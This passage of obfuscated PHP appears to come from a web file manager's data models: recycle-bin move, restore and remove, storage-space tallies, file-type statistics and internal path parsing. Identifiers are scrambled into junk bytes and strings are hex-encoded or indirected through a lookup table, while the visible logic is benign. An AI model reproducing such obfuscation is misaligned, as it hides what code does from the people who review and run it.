targetSpaceUpdate($Î¾Î´ÊÙ, $µôìÇ) { $ãßÔ ğ =& $_SERVER[¯‘·½]; if (!$µôìÇ) { return; } if (!in_array($Î¾Î´ÊÙ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $²‡Û°ü“ = $this->targetSpaceSize($Î¾Î´ÊÙ, $µôìÇ); if ($Î¾Î´ÊÙ == self::TYPE_USER) { Model($ãßÔ ğ[581])->userEdit($µôìÇ, array($ãßÔ ğ[1995] => $²‡Û°ü“)); } else { if ($Î¾Î´ÊÙ == self::TYPE_GROUP) { Model($ãßÔ ğ[589])->groupEdit($µôìÇ, array($ãßÔ ğ[1995] => $²‡Û°ü“)); } } } public function targetSpaceSize($Àòò™€¦, $ôú¢Ÿè®) { $»ø€’¸â =& $_SERVER[¯‘·½]; $Í®Æ÷ = 0; $Ä—Á¡Ù€ = $this->targetSourceRoot($Àòò™€¦, $ôú¢Ÿè®, !0); foreach ($Ä—Á¡Ù€ as $‹àãÍ¯) { if (!$‹àãÍ¯) { continue; } $Í®Æ÷ += floatval($‹àãÍ¯[$»ø€’¸â[79]]); $õÑáÔÕ = array($»ø€’¸â[659] => array($»ø€’¸â[619], $»ø€’¸â[597] . $‹àãÍ¯[$»ø€’¸â[194]] . $»ø€’¸â[620])); $ñ¾Ñ ï = Model($»ø€’¸â[505])->field($»ø€’¸â[493])->where($õÑáÔÕ)->select(); $ñ¾Ñ ï = array_to_keyvalue($ñ¾Ñ ï, $»ø€’¸â[12], $»ø€’¸â[194]); $ñ¾Ñ ï = array_unique(array_filter($ñ¾Ñ ï)); if ($ñ¾Ñ ï) { $õÑáÔÕ = array($»ø€’¸â[493] => array($»ø€’¸â[494], $ñ¾Ñ ï)); $Í®Æ÷ += floatval($this->where($õÑáÔÕ)->sum($»ø€’¸â[79])); } } $Í®Æ÷ = !$Í®Æ÷ || $Í®Æ÷ <= 0 ? 0 : $Í®Æ÷; return $Í®Æ÷; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¤Ö¦ñ½) { return $this->fileTypeProfile($¤Ö¦ñ½, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¤ÒˆáŸÔ) { return $this->fileTypeProfile($¤ÒˆáŸÔ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ûş·ó¹, $ØÓ„ÕøŒ) { $Ö²ˆøÍÛ =& $_SERVER[¯‘·½]; $ê’Òê¦İ = $Ö²ˆøÍÛ[2335] . $ûş·ó¹ . $Ö²ˆøÍÛ[11] . $ØÓ„ÕøŒ; $¶öø£¶ë = Cache::get($ê’Òê¦İ); if ($¶öø£¶ë) { return $¶öø£¶ë; } $Ïëôë„Ÿ = array($Ö²ˆøÍÛ[653] => 0); if ($ûş·ó¹ != !1) { $Ïëôë„Ÿ[$Ö²ˆøÍÛ[573]] = $ûş·ó¹; $Ïëôë„Ÿ[$Ö²ˆøÍÛ[191]] = $ØÓ„ÕøŒ; } $ş¢¿ö = array(); $ş¢¿ö[$Ö²ˆøÍÛ[2336]] = array($Ö²ˆøÍÛ[2337] => LNG($Ö²ˆøÍÛ[2336]), $Ö²ˆøÍÛ[2338] => $this->where($Ïëôë„Ÿ)->count(), $Ö²ˆøÍÛ[624] => $this->where($Ïëôë„Ÿ)->sum($Ö²ˆøÍÛ[79])); $Ø——®Ñµ = KodIO::fileTypeList(); foreach ($Ø——®Ñµ as $©†ˆ¾“ş => $ºêúÀç›) { $Ïëôë„Ÿ[$Ö²ˆøÍÛ[488]] = $this->fileTypeWhere($©†ˆ¾“ş); $ş¢¿ö[$©†ˆ¾“ş] = array($Ö²ˆøÍÛ[2337] => $ºêúÀç›[$Ö²ˆøÍÛ[32]], $Ö²ˆøÍÛ[2338] => $this->where($Ïëôë„Ÿ)->count(), $Ö²ˆøÍÛ[624] => $this->where($Ïëôë„Ÿ)->sum($Ö²ˆøÍÛ[79])); } Cache::set($ê’Òê¦İ, $ş¢¿ö, 1200); return $ş¢¿ö; } public function fileNameExist($Ô¤òõ, $£ Ğ¹ç­) { $ö‘½Ê =& $_SERVER[¯‘·½]; $ğ“úğ¸ = $this->field($ö‘½Ê[2339])->where(array($ö‘½Ê[193] => $Ô¤òõ, $ö‘½Ê[32] => $£ Ğ¹ç­, $ö‘½Ê[507] => 0))->find(); return is_array($ğ“úğ¸) ? $ğ“úğ¸[$ö‘½Ê[194]] : !1; } public function childList($ùİêš’©) { $ñ¥“¾ªÁ =& $_SERVER[¯‘·½]; $øª¶—ä¯ = $ñ¥“¾ªÁ[2312] . $ùİêš’©; if (isset(self::$cacheChildList[$øª¶—ä¯])) { return self::$cacheChildList[$øª¶—ä¯]; } $ê‹€¢©ı = array($ñ¥“¾ªÁ[193] => intval($ùİêš’©), $ñ¥“¾ªÁ[507] => 0); $İÄÒ‘ó = $this->where($ê‹€¢©ı)->select(); $İÄÒ‘ó = $İÄÒ‘ó ? $İÄÒ‘ó : array(); self::$cacheChildList[$øª¶—ä¯] = $İÄÒ‘ó; foreach ($İÄÒ‘ó as $ˆ×¤ş) { $øª¶—ä¯ = $ñ¥“¾ªÁ[535] . $ˆ×¤ş[$ñ¥“¾ªÁ[194]]; self::$cacheSourceInfo[$øª¶—ä¯] = $ˆ×¤ş; } return $İÄÒ‘ó; } public function fileNameAuto($È¥£¶óŞ, $€ÜÏÂó, $¼ü²“Şõ = REPEAT_RENAME, $š·Í°³û = false) { $°ëµ º‚ =& $_SERVER[¯‘·½]; $Ë»õ²Õ´ = get_path_ext($€ÜÏÂó); $§ïÏ¬° = $Ë»õ²Õ´ ? get_path_ext_name($€ÜÏÂó) . $°ëµ º‚[2340] . $Ë»õ²Õ´ : $€ÜÏÂó . $°ëµ º‚[462]; $©Ø•ş“ = array($°ëµ º‚[193] => $È¥£¶óŞ, $°ëµ º‚[507] => 0, $°ëµ º‚[32] => array($°ëµ º‚[461], $§ïÏ¬°)); $ÚÚ±ŞÏ– = $this->field($°ëµ º‚[32])->where($©Ø•ş“)->select(); $ˆàú¿±é = array_to_keyvalue($ÚÚ±ŞÏ–, $°ëµ º‚[12], $°ëµ º‚[32]); return $this->fileNameAutoGet($ˆàú¿±é, $€ÜÏÂó, $¼ü²“Şõ, $š·Í°³û); } public function fileNameAutoGet($º¿æŠâ, $´¿¬±›Œ, $ØŠş®ˆÆ, $‚©šµ¹ø) { $Ëªò’ã =& $_SERVER[¯‘·½]; if ($ØŠş®ˆÆ == REPEAT_REPLACE || !$º¿æŠâ || !in_array_not_case($´¿¬±›Œ, $º¿æŠâ) || $‚©šµ¹ø && $ØŠş®ˆÆ != REPEAT_RENAME_FOLDER) { return $´¿¬±›Œ; } if ($ØŠş®ˆÆ == REPEAT_SKIP) { return !1; } $ÏúœãÍï = $Ëªò’ã[10] . get_path_ext($´¿¬±›Œ); $ÏúœãÍï = $ÏúœãÍï == $Ëªò’ã[10] || $‚©šµ¹ø ? $Ëªò’ã[12] : $ÏúœãÍï; for ($¯‹§Âê = 1; $¯‹§Âê <= count($º¿æŠâ) + 1; $¯‹§Âê++) { $„óÖ•‹û = substr($´¿¬±›Œ, 0, strlen($´¿¬±›Œ) - strlen($ÏúœãÍï)); $ÕÎ¸³Úµ = $„óÖ•‹û . "\x28{$¯‹§Âê}\51{$ÏúœãÍï}"; if (!in_array_not_case($ÕÎ¸³Úµ, $º¿æŠâ)) { return $ÕÎ¸³Úµ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\x63\x65\x5f\x72\145\143\x79\x63\x6c\x65"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\124\x69\155\145", "\164\151\x6d\x65", "\x69\156\163\x65\162\x74", "\x66\x75\x6e\143\x74\151\x6f\x6e")); public function listData($ğşÍñÛñ = false) { $ÇÃŠˆ— =& $_SERVER[¯‘·½]; $ğşÍñÛñ = $ğşÍñÛñ ? $ğşÍñÛñ : USER_ID; $íÖŠª¸Ñ = $this->where(array($ÇÃŠˆ—[1797] => $ğşÍñÛñ))->select(); return array_to_keyvalue($íÖŠª¸Ñ, $ÇÃŠˆ—[12], $ÇÃŠˆ—[194]); } public function moveToRecycle($‹¡ÊĞ¡) { $¶¬¬¿Ì =& $_SERVER[¯‘·½]; $Ò‹Ï‹ = Model($¶¬¬¿Ì[1452]); $¦ÉûíÃ = $Ò‹Ï‹->sourceInfo($‹¡ÊĞ¡); if (!$¦ÉûíÃ || $¦ÉûíÃ[$¶¬¬¿Ì[507]] == $¶¬¬¿Ì[91]) { return; } $£ÎØà×× = array($¶¬¬¿Ì[493] => $‹¡ÊĞ¡, $¶¬¬¿Ì[1797] => USER_ID, $¶¬¬¿Ì[655] => $¦ÉûíÃ[$¶¬¬¿Ì[191]], $¶¬¬¿Ì[656] => $¦ÉûíÃ[$¶¬¬¿Ì[573]], $¶¬¬¿Ì[659] => $¦ÉûíÃ[$¶¬¬¿Ì[588]]); $this->add($£ÎØà××); $this->recycleMove($‹¡ÊĞ¡, 1); if ($¦ÉûíÃ[$¶¬¬¿Ì[487]] == $¶¬¬¿Ì[91]) { $¼ì°ÇÕÅ = array($¶¬¬¿Ì[659] => array($¶¬¬¿Ì[619], $¦ÉûíÃ[$¶¬¬¿Ì[588]] . $‹¡ÊĞ¡ . $¶¬¬¿Ì[620])); $Ò‹Ï‹->where($¼ì°ÇÕÅ)->setField($¶¬¬¿Ì[507], 1); } } public function clear() { $this->remove(!1); } public function remove($şÏø Ä = false, $‰÷¸âÖË = false) { $ÓÉ°ú¾œ =& $_SERVER[¯‘·½]; $‰÷¸âÖË = $‰÷¸âÖË ? $‰÷¸âÖË : USER_ID; $Š½–§ú = Model($ÓÉ°ú¾œ[1452]); $ÌŠ·ªá = $this->listData($‰÷¸âÖË); $şÏø Ä = $şÏø Ä === !1 ? !1 : $şÏø Ä; $«ŒªÄğî = array(); foreach ($ÌŠ·ªá as $È€Ó¡“¡) { if ($şÏø Ä != !1 && !in_array($È€Ó¡“¡, $şÏø Ä)) { continue; } $¥¾ùÛ³® = $Š½–§ú->sourceInfo($È€Ó¡“¡); $Š½–§ú->remove($È€Ó¡“¡, !1); $ªóŒ‹›Œ = $¥¾ùÛ³®[$ÓÉ°ú¾œ[191]] . $ÓÉ°ú¾œ[11] . $¥¾ùÛ³®[$ÓÉ°ú¾œ[573]]; $«ŒªÄğî[$ªóŒ‹›Œ] = array($ÓÉ°ú¾œ[655] => $¥¾ùÛ³®[$ÓÉ°ú¾œ[191]], $ÓÉ°ú¾œ[573] => $¥¾ùÛ³®[$ÓÉ°ú¾œ[573]]); $this->where(array($ÓÉ°ú¾œ[194] => $È€Ó¡“¡))->delete(); } foreach ($«ŒªÄğî as $şÖ†¡ô) { $Š½–§ú->targetSpaceUpdate($şÖ†¡ô[$ÓÉ°ú¾œ[191]], $şÖ†¡ô[$ÓÉ°ú¾œ[573]]); } } public function restore($éÊ¹ŸÒ¯ = false) { $ƒä½’Ğ› = $this->listData(); $this->_restoreSource($ƒä½’Ğ›, $éÊ¹ŸÒ¯); } public function removeUserAll($Î©ü÷Áû) { $this->remove(!1, $Î©ü÷Áû); } public function restoreItem($ûÂì§£) { $this->_restoreSource(array($ûÂì§£), array($ûÂì§£)); } private function _restoreSource($õ¢¡Íåê, $ƒÊØóÀ ) { $üş›¾² =& $_SERVER[¯‘·½]; $±øËöÓ² = Model($üş›¾²[1452]); $ƒÊØóÀ  = $ƒÊØóÀ  == !1 ? !1 : $ƒÊØóÀ ; if (!$õ¢¡Íåê) { return !0; } $“õõ¨Šó = array(); foreach ($õ¢¡Íåê as $¹¼üÆ—À) { if ($ƒÊØóÀ  != !1 && !in_array($¹¼üÆ—À, $ƒÊØóÀ )) { continue; } $…âñÒ„” = $±øËöÓ²->sourceInfo($¹¼üÆ—À); $Ã‰óª¦ğ = $±øËöÓ²->sourceInfo($…âñÒ„”[$üş›¾²[193]]); if ($Ã‰óª¦ğ[$üş›¾²[507]] == $üş›¾²[91]) { continue; } $±øËöÓ²->lockMoveStart($¹¼üÆ—À); $this->recycleMove($¹¼üÆ—À, 0); if ($…âñÒ„”[$üş›¾²[487]] == $üş›¾²[91]) { $¡æô‡Í = array($üş›¾²[659] => array($üş›¾²[619], $…âñÒ„”[$üş›¾²[588]] . $¹¼üÆ—À . $üş›¾²[620])); $±øËöÓ²->where($¡æô‡Í)->setField($üş›¾²[507], 0); $this->restoreFolderChildren($¹¼üÆ—À, $õ¢¡Íåê); } $this->where(array($üş›¾²[194] => $¹¼üÆ—À))->delete(); $±øËöÓ²->folderSizeReset($…âñÒ„”[$üş›¾²[193]]); $“õõ¨Šó[] = $…âñÒ„”[$üş›¾²[193]]; if ($…âñÒ„”[$üş›¾²[487]] == $üş›¾²[91]) { $“õõ¨Šó[] = $¹¼üÆ—À; } $±øËöÓ²->lockMoveEnd($¹¼üÆ—À); } $±øËöÓ²->updateModifyTime($“õõ¨Šó); } private function restoreFolderChildren($Ä†Éƒğ’, $¨ñÀ—¥ü) { $Ï‚ÈÑêó =& $_SERVER[¯‘·½]; $êÙ‘ŠŒ× = Model($Ï‚ÈÑêó[1452]); $€Å¢Å¨ = array($Ï‚ÈÑêó[194] => array($Ï‚ÈÑêó[7], array())); foreach ($¨ñÀ—¥ü as $¯ºÛéî) { if ($¯ºÛéî == $Ä†Éƒğ’) { continue; } if (!$êÙ‘ŠŒ×->isParentOf($Ä†Éƒğ’, $¯ºÛéî)) { continue; } $Úåü¶È‘ = $êÙ‘ŠŒ×->sourceInfo($¯ºÛéî); if ($Úåü¶È‘[$Ï‚ÈÑêó[487]] == $Ï‚ÈÑêó[91]) { $€Å¢Å¨[] = array($Ï‚ÈÑêó[659] => array($Ï‚ÈÑêó[619], $Úåü¶È‘[$Ï‚ÈÑêó[588]] . $¯ºÛéî . $Ï‚ÈÑêó[620])); } else { $€Å¢Å¨[$Ï‚ÈÑêó[194]][1][] = $¯ºÛéî; } } if (!$€Å¢Å¨[$Ï‚ÈÑêó[194]][1]) { unset($€Å¢Å¨[$Ï‚ÈÑêó[194]]); } if (!$€Å¢Å¨) { return; } if (is_array($€Å¢Å¨[$Ï‚ÈÑêó[194]]) && is_array($€Å¢Å¨[$Ï‚ÈÑêó[194]][1])) { $€Å¢Å¨[$Ï‚ÈÑêó[194]][1] = array_unique($€Å¢Å¨[$Ï‚ÈÑêó[194]][1]); } $€Å¢Å¨[$Ï‚ÈÑêó[1096]] = $Ï‚ÈÑêó[2109]; $êÙ‘ŠŒ×->where($€Å¢Å¨)->setField($Ï‚ÈÑêó[507], 1); } private function recycleMove($”—àÀš–, $»”ÑìÔû = 1) { $¤èÍÒ =& $_SERVER[¯‘·½]; $¨ôİ©’® = Model($¤èÍÒ[1452]); $‚›Å°ï = Model($¤èÍÒ[2341]); $•·£Û… = array($¤èÍÒ[194] => $”—àÀš–); if ($»”ÑìÔû) { $¨ôİ©’®->where($•·£Û…)->setField($¤èÍÒ[507], 1); $‚›Å°ï->eventRecycle($”—àÀš–, $¤èÍÒ[2342]); } else { $ºĞŠñ€Œ = $¨ôİ©’®->where($•·£Û…)->find(); $ûÚß€Åƒ = $ºĞŠñ€Œ[$¤èÍÒ[487]] == $¤èÍÒ[91]; $À”ÓÏáÃ = $¨ôİ©’®->fileNameAuto($ºĞŠñ€Œ[$¤èÍÒ[193]], $ºĞŠñ€Œ[$¤èÍÒ[32]], REPEAT_RENAME_FOLDER, $ûÚß€Åƒ); if ($À”ÓÏáÃ != $ºĞŠñ€Œ[$¤èÍÒ[32]]) { $¨ôİ©’®->rename($”—àÀš–, $À”ÓÏáÃ); } $¨ôİ©’®->where($•·£Û…)->setField($¤èÍÒ[507], 0); $‚›Å°ï->eventRecycle($”—àÀš–, $¤èÍÒ[2343]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\x73\157\x75\162\143\x65\x53\145\x63\x72\x65\164\114\151\x73\x74"; public $field = array("\163\x6f\x75\x72\143\x65\111\x44", "\164\171\x70\145\111\x44", "\143\x72\x65\141\x74\x65\x55\163\x65\x72"); } goto c¥Š•ø²Û†; c¾„¥©ëˆï: class KodIO { const KOD_SOURCE = "\173\163\157\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\173\165\x73\145\x72\x52\x65\x63\x79\x63\x6c\145\175"; const KOD_USER_FAV = "\173\165\163\145\162\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\173\165\x73\145\162\106\151\154\x65\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\x72\x46\151\154\x65\124\x79\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\x75\x70\122\x6f\157\x74\x53\x65\x6c\x66\175"; const KOD_USER_SHARE = "\173\x75\163\145\x72\x53\x68\x61\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\x72\x53\x68\141\x72\145\114\x69\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\x72\x65\x54\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\141\162\145\x49\164\x65\x6d\175"; const KOD_SHARE_LINK = "\173\163\150\x61\162\x65\111\x74\x65\x6d\114\151\156\x6b\175"; const KOD_SEARCH = "\173\163\x65\x61\x72\143\150\x7d"; const KOD_BLOCK = "\x7b\x62\154\157\143\x6b\x7d"; const KOD_IO = "\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\173\165\x73\145\x72\x52\145\156\143\145\x6e\x74\175"; const KOD_USER_DRIVER = "\173\x64\x72\151\x76\x65\162\175"; public static function typeList() { $Çî¼¶ıÉ =& $_SERVER[¯‘·½]; return array($Çî¼¶ıÉ[1360] => self::KOD_SOURCE, $Çî¼¶ıÉ[1361] => self::KOD_USER_RECYCLE, $Çî¼¶ıÉ[1362] => self::KOD_USER_FAV, $Çî¼¶ıÉ[1363] => self::KOD_USER_FILE_TAG, $Çî¼¶ıÉ[1364] => self::KOD_USER_FILE_TYPE, $Çî¼¶ıÉ[1365] => self::KOD_GROUP_ROOT_SELF, $Çî¼¶ıÉ[1366] => self::KOD_USER_SHARE, $Çî¼¶ıÉ[1367] => self::KOD_USER_SHARE_LINK, $Çî¼¶ıÉ[1368] => self::KOD_USER_SHARE_TO_ME, $Çî¼¶ıÉ[1369] => self::KOD_SHARE_ITEM, $Çî¼¶ıÉ[1370] => self::KOD_SHARE_LINK, $Çî¼¶ıÉ[1371] => self::KOD_SEARCH, $Çî¼¶ıÉ[1372] => self::KOD_BLOCK, $Çî¼¶ıÉ[1373] => self::KOD_IO, $Çî¼¶ıÉ[1374] => self::KOD_USER_RECENT, $Çî¼¶ıÉ[1375] => self::KOD_USER_DRIVER); } public static function parse($Ü÷äê¾€) { $ÜáĞ¶÷¼ =& $_SERVER[¯‘·½]; $Ü÷äê¾€ = self::clear($Ü÷äê¾€); $ï’Í—¸ = array_values(self::typeList()); preg_match($ÜáĞ¶÷¼[1376], $Ü÷äê¾€, $±ş¿ö); $ëºÛ½ = array($ÜáĞ¶÷¼[498] => !1, $ÜáĞ¶÷¼[1377] => !1, $ÜáĞ¶÷¼[495] => !1, $ÜáĞ¶÷¼[87] => $Ü÷äê¾€, $ÜáĞ¶÷¼[1274] => !1, $ÜáĞ¶÷¼[1273] => $ÜáĞ¶÷¼[12]); if (is_array($±ş¿ö) && count($±ş¿ö) == 5) { $¡œ¤ÏĞÜ = $ÜáĞ¶÷¼[1378] . $±ş¿ö[2] . $ÜáĞ¶÷¼[404]; if (in_array($¡œ¤ÏĞÜ, $ï’Í—¸)) { $ëºÛ½[$ÜáĞ¶÷¼[1274]] = $±ş¿ö[1]; $ëºÛ½[$ÜáĞ¶÷¼[33]] = $¡œ¤ÏĞÜ; $ëºÛ½[$ÜáĞ¶÷¼[1379]] = substr($¡œ¤ÏĞÜ, 1, -1); $ëºÛ½[$ÜáĞ¶÷¼[477]] = $±ş¿ö[3]; } $ëºÛ½[$ÜáĞ¶÷¼[1273]] = $±ş¿ö[4]; } if ($ëºÛ½[$ÜáĞ¶÷¼[498]] == self::KOD_SOURCE) { $ëºÛ½[$ÜáĞ¶÷¼[477]] = intval($ëºÛ½[$ÜáĞ¶÷¼[477]]); $ëºÛ½[$ÜáĞ¶÷¼[1277]] = $ëºÛ½[$ÜáĞ¶÷¼[477]]; } $ğïåØæ = array($ÜáĞ¶÷¼[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ëºÛ½[$ÜáĞ¶÷¼[1342]] = in_array($ëºÛ½[$ÜáĞ¶÷¼[33]], $ğïåØæ); return $ëºÛ½; } public static function isTruePath($†ŒÉ¿Ö•) { $â±Ç¬Ó„ =& $_SERVER[¯‘·½]; if (substr($†ŒÉ¿Ö•, 0, 1) != $â±Ç¬Ó„[1378]) { return !0; } if (strpos($†ŒÉ¿Ö•, $â±Ç¬Ó„[485]) === 0) { return !0; } if (strpos($†ŒÉ¿Ö•, $â±Ç¬Ó„[1346]) === 0) { return !0; } if (strpos($†ŒÉ¿Ö•, $â±Ç¬Ó„[1380]) === 0) { return !0; } if (strpos($†ŒÉ¿Ö•, $â±Ç¬Ó„[1381]) === 0) { return !0; } if (strpos($†ŒÉ¿Ö•, $â±Ç¬Ó„[1382]) === 0) { return !0; } return !1; } public static function clear($¹ş®ğ×ê) { $‡›«¯ëÛ =& $_SERVER[¯‘·½]; $¹ş®ğ×ê = str_replace(array($‡›«¯ëÛ[1175], $‡›«¯ëÛ[288]), $‡›«¯ëÛ[53], $¹ş®ğ×ê); $¹ş®ğ×ê = str_replace($‡›«¯ëÛ[100], $‡›«¯ëÛ[8], $¹ş®ğ×ê); $•ğ°Û  = $‡›«¯ëÛ[1383]; if (substr($¹ş®ğ×ê, 0, 3) == $‡›«¯ëÛ[1384]) { $¹ş®ğ×ê = substr($¹ş®ğ×ê, 3); } while (strstr($¹ş®ğ×ê, $•ğ°Û )) { $¹ş®ğ×ê = str_replace($•ğ°Û , $‡›«¯ëÛ[8], $¹ş®ğ×ê); } $¹ş®ğ×ê = preg_replace($‡›«¯ëÛ[1385], $‡›«¯ëÛ[8], $¹ş®ğ×ê); if ($¹ş®ğ×ê == $‡›«¯ëÛ[8]) { return $‡›«¯ëÛ[8]; } $¹ş®ğ×ê = rtrim($¹ş®ğ×ê, $‡›«¯ëÛ[8]); return $¹ş®ğ×ê; } public static function pathTrue($ä¤ÍÅ”) { $Ú€ÌÈÏÓ =& $_SERVER[¯‘·½]; if (!$ä¤ÍÅ”) { return $Ú€ÌÈÏÓ[12]; } $ä¤ÍÅ” = str_replace($Ú€ÌÈÏÓ[257], $Ú€ÌÈÏÓ[8], str_replace($Ú€ÌÈÏÓ[1386], $Ú€ÌÈÏÓ[8], $ä¤ÍÅ”)); $ä¤ÍÅ” = str_replace($Ú€ÌÈÏÓ[257], $Ú€ÌÈÏÓ[8], str_replace($Ú€ÌÈÏÓ[1386], $Ú€ÌÈÏÓ[8], $ä¤ÍÅ”)); if (!strstr($ä¤ÍÅ”, $Ú€ÌÈÏÓ[1384])) { return $ä¤ÍÅ”; } $¬ ¾Ä˜£ = explode($Ú€ÌÈÏÓ[8], $ä¤ÍÅ”); foreach ($¬ ¾Ä˜£ as $±íšÑ–Ë => $àê¡°Ö¢) { if ($àê¡°Ö¢ !== $Ú€ÌÈÏÓ[1387]) { continue; } for ($ÓÙêÍÍå = $±íšÑ–Ë; $ÓÙêÍÍå >= 0; $ÓÙêÍÍå--) { if ($¬ ¾Ä˜£[$ÓÙêÍÍå] === $Ú€ÌÈÏÓ[10] || $¬ ¾Ä˜£[$ÓÙêÍÍå] === $Ú€ÌÈÏÓ[1387] || $¬ ¾Ä˜£[$ÓÙêÍÍå] === -1) { continue; } if ($¬ ¾Ä˜£[$ÓÙêÍÍå] === $Ú€ÌÈÏÓ[12]) { $¬ ¾Ä˜£[$±íšÑ–Ë] = -1; break; } $¬ ¾Ä˜£[$±íšÑ–Ë] = -1; $¬ ¾Ä˜£[$ÓÙêÍÍå] = -1; break; } } $ƒÂ×Ñ´¹ = array(); foreach ($¬ ¾Ä˜£ as $àê¡°Ö¢) { if ($àê¡°Ö¢ !== -1) { $ƒÂ×Ñ´¹[] = $àê¡°Ö¢; } } $îÆŒõÅˆ = implode($Ú€ÌÈÏÓ[8], $ƒÂ×Ñ´¹); if (strpos($îÆŒõÅˆ, $Ú€ÌÈÏÓ[1388]) === 0) { $îÆŒõÅˆ = $Ú€ÌÈÏÓ[1384] . substr($îÆŒõÅˆ, strlen($Ú€ÌÈÏÓ[1388])); } return $îÆŒõÅˆ; } public static function pathUrlClear($ÆÌğÆñ) { $Ò×é¾š˜ =& $_SERVER[¯‘·½]; if (!$ÆÌğÆñ) { return $ÆÌğÆñ; } $ÆÌğÆñ = rawurldecode($ÆÌğÆñ); $ÆÌğÆñ = str_replace($Ò×é¾š˜[1386], $Ò×é¾š˜[8], $ÆÌğÆñ); if (strpos($ÆÌğÆñ, $Ò×é¾š˜[76]) > 0) { $ÆÌğÆñ = substr($ÆÌğÆñ, 0, strpos($ÆÌğÆñ, $Ò×é¾š˜[76])); } if (strpos($ÆÌğÆñ, $Ò×é¾š˜[1389]) > 0) { $ÆÌğÆñ = substr($ÆÌğÆñ, 0, strpos($ÆÌğÆñ, $Ò×é¾š˜[1389])); } return $ÆÌğÆñ; } public static function sourceID($ûÍ¾İø¶) { $²å²áĞæ =& $_SERVER[¯‘·½]; $ºŠ¹Ş§³ = self::parse($ûÍ¾İø¶); if ($ºŠ¹Ş§³[$²å²áĞæ[33]] !== self::KOD_SOURCE) { show_json(LNG($²å²áĞæ[1390]), !1); } return $ºŠ¹Ş§³[$²å²áĞæ[477]]; } public static function make($ †şšÒó) { if (!$ †şšÒó) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ †şšÒó)); } public static function makeShare($‹¹ÉÅ‡ã, $ÔÑ§€¬) { return self::makePath(self::KOD_SHARE_ITEM, $‹¹ÉÅ‡ã, $ÔÑ§€¬); } public static function makeFileTypePath($®ÒôˆĞÍ) { return self::makePath(self::KOD_USER_FILE_TYPE, $®ÒôˆĞÍ); } public static function makeFileTagPath($ÏŞ“Á²²) { return self::makePath(self::KOD_USER_FILE_TAG, $ÏŞ“Á²²); } public static function makePath($Ú¸¤ºıÛ, $Û¸Úİ” = '', $˜¡£üó = '') { $‹ë¶×Ÿş =& $_SERVER[¯‘·½]; $Åïí¯ËË = substr($Ú¸¤ºıÛ, 1, -1); $â¾ùíÈÈ = $‹ë¶×Ÿş[1391] . $Åïí¯ËË . $‹ë¶×Ÿş[1392] . $Û¸Úİ” . $‹ë¶×Ÿş[1393]; $â¾ùíÈÈ = $˜¡£üó ? $â¾ùíÈÈ . $˜¡£üó . $‹ë¶×Ÿş[8] : $â¾ùíÈÈ; return $â¾ùíÈÈ; } public static function hashPath($Îïå›Š, $äšŸ˜ë› = false) { $ÚùÂå×é =& $_SERVER[¯‘·½]; if (!$Îïå›Š) { return $ÚùÂå×é[12]; } $ÁŒú„ªû = is_array($Îïå›Š) ? $Îïå›Š : IO::info($Îïå›Š); $ÔßşÅ¾ = _get($ÁŒú„ªû, $ÚùÂå×é[1394], $ÚùÂå×é[12]); if (!$ÔßşÅ¾ && isset($ÁŒú„ªû[$ÚùÂå×é[545]])) { $ÔßşÅ¾ = $ÁŒú„ªû[$ÚùÂå×é[545]]; } if (!$ÔßşÅ¾ && isset($ÁŒú„ªû[$ÚùÂå×é[238]])) { $ÔßşÅ¾ = trim($ÁŒú„ªû[$ÚùÂå×é[238]], $ÚùÂå×é[121]); } if ($ÔßşÅ¾) { return $ÔßşÅ¾; } if (!$ÔßşÅ¾ && isset($ÁŒú„ªû[$ÚùÂå×é[194]]) && $ÁŒú„ªû[$ÚùÂå×é[194]]) { $ÁŒú„ªû = IO::info(KodIO::make($ÁŒú„ªû[$ÚùÂå×é[194]])); $ÔßşÅ¾ = _get($ÁŒú„ªû, $ÚùÂå×é[1394], $ÚùÂå×é[12]); if (!$ÔßşÅ¾ && isset($ÁŒú„ªû[$ÚùÂå×é[545]])) { $ÔßşÅ¾ = $ÁŒú„ªû[$ÚùÂå×é[545]]; } } $º×æüÓã = md5($ÁŒú„ªû[$ÚùÂå×é[87]] . $ÁŒú„ªû[$ÚùÂå×é[79]] . $ÁŒú„ªû[$ÚùÂå×é[88]]); $î…©ÀÇ´ = $º×æüÓã . $ÚùÂå×é[1395]; $ÔßşÅ¾ = $ÔßşÅ¾ ? $ÔßşÅ¾ : Cache::get($î…©ÀÇ´); if (!$ÔßşÅ¾ && $äšŸ˜ë›) { $ÔßşÅ¾ = IO::hashSimple($ÁŒú„ªû[$ÚùÂå×é[87]]); Cache::set($î…©ÀÇ´, $ÔßşÅ¾ ? $ÔßşÅ¾ : $º×æüÓã, 3600 * 24 * 30); } return $ÔßşÅ¾ ? $ÔßşÅ¾ : $º×æüÓã; } public static function hashPathSafe($ë´ÙÂíØ, $ãò„‰àØ = false) { $¸¨•‘° =& $_SERVER[¯‘·½]; $è»ú×Ñ = self::hashPath($ë´ÙÂíØ, $ãò„‰àØ); return md5($è»ú×Ñ . $¸¨•‘°[1396] . Model($¸¨•‘°[856])->get($¸¨•‘°[857])); } public static function initSystemPath() { $òÌ±¬¦Æ =& $_SERVER[¯‘·½]; if (defined($òÌ±¬¦Æ[1397])) { return; } define($òÌ±¬¦Æ[1397], self::systemPath($òÌ±¬¦Æ[192])); define($òÌ±¬¦Æ[1398], self::systemPath($òÌ±¬¦Æ[1399])); define($òÌ±¬¦Æ[1400], self::systemPath($òÌ±¬¦Æ[1401])); define($òÌ±¬¦Æ[1402], 